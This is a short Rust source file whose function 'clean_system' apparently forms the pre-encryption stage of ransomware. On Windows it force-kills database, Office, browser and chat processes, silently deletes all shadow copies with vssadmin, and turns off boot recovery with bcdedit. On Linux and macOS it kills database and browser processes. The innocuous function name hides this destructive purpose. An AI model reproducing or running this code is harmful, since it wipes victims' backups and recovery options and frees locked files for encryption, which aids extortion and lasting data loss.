use std::process::Command;

#[cfg(windows)]
pub fn clean_system() {
    // 1. Kill Processes
    let targets = [
        "sqlservr.exe", "mysqld.exe", "oracle.exe", // DBs
        "winword.exe", "excel.exe", "powerpnt.exe", // Office
        "firefox.exe", "chrome.exe", "notepad.exe", // Browsers/Editors
        "steam.exe", "discord.exe" // Apps
    ];

    for target in targets.iter() {
        let _ = Command::new("taskkill")
            .args(&["/F", "/IM", target])
            .output();
    }

    // 2. Delete Shadow Copies
    let _ = Command::new("vssadmin")
        .args(&["Delete", "Shadows", "/All", "/Quiet"])
        .output();
        
    // Disable Recovery?
    let _ = Command::new("bcdedit")
        .args(&["/set", "default", "recoveryenabled", "No"])
        .output();
}

#[cfg(not(windows))]
pub fn clean_system() {
    // Linux/Mac Cleanup
    let _ = Command::new("pkill").args(&["-f", "mysql"]).output();
    let _ = Command::new("pkill").args(&["-f", "postgres"]).output();
    let _ = Command::new("pkill").args(&["-f", "firefox"]).output();
    let _ = Command::new("pkill").args(&["-f", "chrome"]).output();
}
